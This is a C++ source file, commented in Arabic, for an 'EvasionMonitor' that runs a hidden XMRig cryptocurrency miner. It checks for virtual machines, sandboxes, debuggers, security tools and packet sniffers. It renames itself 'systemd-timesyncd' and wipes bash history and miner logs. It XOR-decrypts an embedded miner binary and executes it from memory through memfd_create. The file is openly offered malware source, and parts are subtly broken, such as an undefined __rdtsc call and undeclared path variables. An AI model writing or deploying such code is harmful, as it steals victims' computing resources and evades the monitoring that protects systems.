#include <cstdint>
#include <chrono>
#include <thread>
// inline RDTSC for VM timing detection
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}
#include "evasion_monitor.h"
#include "binary_embedder.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <cstring>
#include <algorithm>
#include <sys/ptrace.h>
#include <signal.h>
#include <cstdlib>
#include <sys/mman.h>  // for memfd_create
#include <linux/memfd.h>
#include <unistd.h>    // for fexecve, environ
#include <zlib.h>  // for uncompress

// قائمة أدوات الأمان والمراقبة المعروفة
std::vector<std::string> EvasionMonitor::getSecurityProcessList() {
    return {
        "wireshark", "tcpdump", "strace", "ltrace", "gdb", "lldb",
        "valgrind", "perf", "htop", "top", "iotop", "netstat",
        "lsof", "ss", "nmap", "masscan", "metasploit", "burp",
        "owasp-zap", "nikto", "sqlmap", "nessus", "openvas",
        "chkrootkit", "rkhunter", "clamav", "clamd", "freshclam",
        "tripwire", "aide", "samhain", "ossec", "wazuh",
        "snort", "suricata", "zeek", "bro", "fail2ban",
        "iptables", "ufw", "firewalld", "apparmor", "selinux"
    };
}

bool EvasionMonitor::checkProcessByName(const std::string& processName) {
    std::ifstream proc("/proc/loadavg");
    if (!proc.is_open()) return false;
    
    // فحص العمليات النشطة
    DIR* procDir = opendir("/proc");
    if (!procDir) return false;
    
    struct dirent* entry;
    while ((entry = readdir(procDir)) != nullptr) {
        if (strspn(entry->d_name, "0123456789") == strlen(entry->d_name)) {
            std::string cmdlinePath = "/proc/" + std::string(entry->d_name) + "/cmdline";
            std::ifstream cmdlineFile(cmdlinePath);
            std::string cmdline;
            if (std::getline(cmdlineFile, cmdline)) {
                if (cmdline.find(processName) != std::string::npos) {
                    closedir(procDir);
                    return true;
                }
            }
        }
    }
    closedir(procDir);
    return false;
}

bool EvasionMonitor::isSecurityToolRunning() {
    auto securityTools = getSecurityProcessList();
    for (const auto& tool : securityTools) {
        if (checkProcessByName(tool)) {
            std::cout << "[ALERT] Security tool detected: " << tool << std::endl;
            return true;
        }
    }
    return false;
}

bool EvasionMonitor::isVirtualEnvironment() {
    return checkVMIndicators() || checkSandboxEnvironment();
}

bool EvasionMonitor::checkVMIndicators() {
    // فحص مؤشرات VMware, VirtualBox, QEMU
    std::vector<std::string> vmFiles = {
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/bios_vendor"
    };
    
    std::vector<std::string> vmIndicators = {
        "VMware", "VirtualBox", "QEMU", "KVM", "Xen", 
        "Microsoft Corporation", "innotek", "Parallels"
    };
    
    for (const auto& file : vmFiles) {
        std::ifstream f(file);
        std::string content;
        if (std::getline(f, content)) {
            for (const auto& indicator : vmIndicators) {
                if (content.find(indicator) != std::string::npos) {
                    return true;
                }
            }
        }
    }
    
    // TSC timing check for VM detection (RDTSC)
    {
        unsigned long long t0 = __rdtsc();
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
        unsigned long long t1 = __rdtsc();
        unsigned long long delta = t1 - t0;
        // if too low, likely virtualized slow timer
        if (delta < 1000000ULL) {
            return true;
        }
    }

    // فحص MAC addresses مشبوهة
    std::ifstream interfaces("/sys/class/net/eth0/address");
    std::string mac;
    if (std::getline(interfaces, mac)) {
        if (mac.substr(0, 8) == "08:00:27" || // VirtualBox
            mac.substr(0, 8) == "00:0c:29" || // VMware
            mac.substr(0, 8) == "00:50:56") { // VMware
            return true;
        }
    }
    
    return false;
}

bool EvasionMonitor::checkSandboxEnvironment() {
    // فحص البيئات المعزولة والـ sandboxes
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        std::string hostname(unameData.nodename);
        if (hostname.find("sandbox") != std::string::npos ||
            hostname.find("analysis") != std::string::npos ||
            hostname.find("malware") != std::string::npos) {
            return true;
        }
    }
    
    // فحص وجود أدوات تحليل شائعة في المسارات
    std::vector<std::string> analysisTools = {
        "/usr/bin/volatility", "/usr/bin/yara", "/usr/bin/strings",
        "/usr/bin/file", "/usr/bin/hexdump", "/usr/bin/objdump"
    };
    
    for (const auto& tool : analysisTools) {
        struct stat buffer;
        if (stat(tool.c_str(), &buffer) == 0) {
            return true;
        }
    }
    
    return false;
}

bool EvasionMonitor::isDebuggerPresent() {
    // Anti-debugging technique: ptrace detection
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return true; // Already being traced
    }
    ptrace(PTRACE_DETACH, 0, 1, 0);
    
    // فحص ملف status للتحقق من TracerPid
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") != std::string::npos) {
            std::string pid = line.substr(line.find(":") + 1);
            if (std::stoi(pid) != 0) {
                return true;
            }
        }
    }
    
    return false;
}

bool EvasionMonitor::isNetworkMonitored() {
    // فحص وجود network sniffers
    std::vector<std::string> networkTools = {"tcpdump", "wireshark", "tshark", "ettercap"};
    for (const auto& tool : networkTools) {
        if (checkProcessByName(tool)) {
            return true;
        }
    }
    
    // فحص interfaces في promiscuous mode عبر جميع الواجهات
    DIR* netDir = opendir("/sys/class/net");
    if (netDir) {
        struct dirent* ent;
        while ((ent = readdir(netDir)) != nullptr) {
            if (ent->d_name[0] == '.') continue;
            std::string flagPath = std::string("/sys/class/net/") + ent->d_name + "/flags";
            std::ifstream flagFile(flagPath);
            std::string flagsStr;
            if (std::getline(flagFile, flagsStr)) {
                int flagsInt = std::stoi(flagsStr, nullptr, 16);
                if (flagsInt & 0x100) { // IFF_PROMISC
                    closedir(netDir);
                    return true;
                }
            }
        }
        closedir(netDir);
    }
    
    return false;
}

void EvasionMonitor::hideProcessName() {
    // تغيير اسم العملية لتبدو مثل عملية نظام عادية
    const char* fakeName = "systemd-timesyncd";
    
    // تغيير argv[0] - اسم العملية في ps
    extern char** environ;
    char* newName = const_cast<char*>(fakeName);
    
    // محاولة تغيير الاسم (قد لا تعمل في جميع البيئات)
    if (prctl(PR_SET_NAME, fakeName, 0, 0, 0) != 0) {
        // fallback method
        strcpy(newName, fakeName);
    }
}

void EvasionMonitor::mimicLegitimateProcess() {
    // محاكاة سلوك عملية شرعية
    
    // إنشاء ملفات مؤقتة تشبه ما تفعله عمليات النظام
    std::ofstream tmpLog("/tmp/.systemd-timesyncd.log");
    tmpLog << "Synchronized time with NTP server\n";
    tmpLog.close();
    
    // تغيير working directory إلى مكان معقول
    chdir("/var/lib/systemd");
    
    // إنشاء sleep patterns عشوائية لتقليد السلوك الطبيعي
    int sleepTime = 30 + (rand() % 60); // 30-90 ثانية
    sleep(sleepTime);
}

void EvasionMonitor::cleanupTraces() {
    // تنظيف الآثار والملفات المؤقتة
    
    // حذف ملفات السجلات المؤقتة
    std::vector<std::string> tempFiles = {
        "/tmp/xmrig.log", "/tmp/miner.log", "/tmp/.mining",
        "/var/log/xmrig.log", "/home/*/.xmrig"
    };
    
    for (const auto& file : tempFiles) {
        unlink(file.c_str());
    }
    
    // تنظيف command history
    system("history -c");
    unlink("/root/.bash_history");
    unlink("/home/*/.bash_history");
    
    // مسح DNS cache إذا كان موجوداً
    system("systemctl flush-dns 2>/dev/null");
}

bool EvasionMonitor::isMonitoringActive() {
    // فحص شامل لجميع أنواع المراقبة
    
    // فحص الحمل العالي (قد يدل على أدوات مراقبة)
    std::ifstream proc("/proc/loadavg");
    std::string line;
    if (std::getline(proc, line)) {
        double load = std::stod(line.substr(0, 4));
        if (load > 2.0) {
            return true;
        }
    }
    
    // فحص شامل لجميع التهديدات
    if (isVirtualEnvironment()) {
        std::cout << "[ALERT] Virtual environment detected!" << std::endl;
        return true;
    }
    
    if (isDebuggerPresent()) {
        std::cout << "[ALERT] Debugger detected!" << std::endl;
        return true;
    }
    
    if (isSecurityToolRunning()) {
        std::cout << "[ALERT] Security tool detected!" << std::endl;
        return true;
    }
    
    if (isNetworkMonitored()) {
        std::cout << "[ALERT] Network monitoring detected!" << std::endl;
        return true;
    }
    
    return false;
}

void EvasionMonitor::runHiddenMiner() {
    // إخفاء هوية العملية أولاً
    hideProcessName();
    
    // binary will be loaded directly into memory via memfd_create
    
    while (true) {
        // تنظيف الآثار بشكل دوري
        cleanupTraces();
        
        // محاكاة عملية شرعية
        mimicLegitimateProcess();
        
        if (!isMonitoringActive()) {
            std::cout << "[INFO] Environment clear, starting mining simulation..." << std::endl;
            
            // تشغيل XMRig المستخرج كعملية فرعية
            pid_t pid = fork();
            if (pid == 0) {
                // child: decrypt, decompress and load XMRig via memfd
                int fd = memfd_create("xmrig", MFD_CLOEXEC);
                if (fd < 0) _exit(1);
                // XOR decryption of compressed data
                size_t compSize = embedded_xmrig_encrypted_size;
                unsigned char* compBuf = (unsigned char*)malloc(compSize);
                for (size_t i = 0; i < compSize; ++i) {
                    compBuf[i] = embedded_xmrig_encrypted[i] ^ xor_key[i % xor_key_size];
                }
                // decompress via zlib
                unsigned long rawSize = embedded_xmrig_size;
                unsigned char* rawBuf = (unsigned char*)malloc(rawSize);
                if (uncompress(rawBuf, &rawSize, compBuf, compSize) != Z_OK) {
                    _exit(2);
                }
                // write to memfd
                if (write(fd, rawBuf, rawSize) != (ssize_t)rawSize) _exit(3);
                // execute from memfd
                fexecve(fd, (char* const[]){(char*)"xmrig", (char*)"--config=<(memory)", NULL}, environ);
                _exit(4);
            } else if (pid > 0) {
                // parent continues
            } else {
                std::cerr << "[ERROR] fork failed" << std::endl;
            }
        } else {
            std::cout << "[WARNING] Monitoring detected, entering stealth mode..." << std::endl;
            
            // وضع التخفي: تقليل النشاط إلى الحد الأدنى
            sched_yield();
            
            // انتظار أطول عند اكتشاف مراقبة
            std::this_thread::sleep_for(std::chrono::minutes(5));
        }
        
        // فترة راحة عادية بين المحاولات
        std::this_thread::sleep_for(std::chrono::minutes(2));
    }
    
    // تنظيف الملفات المستخرجة عند الانتهاء
    BinaryEmbedder::cleanupExtractedFiles();
    unlink(extractedXMRigPath.c_str());
    unlink(extractedConfigPath.c_str());
}
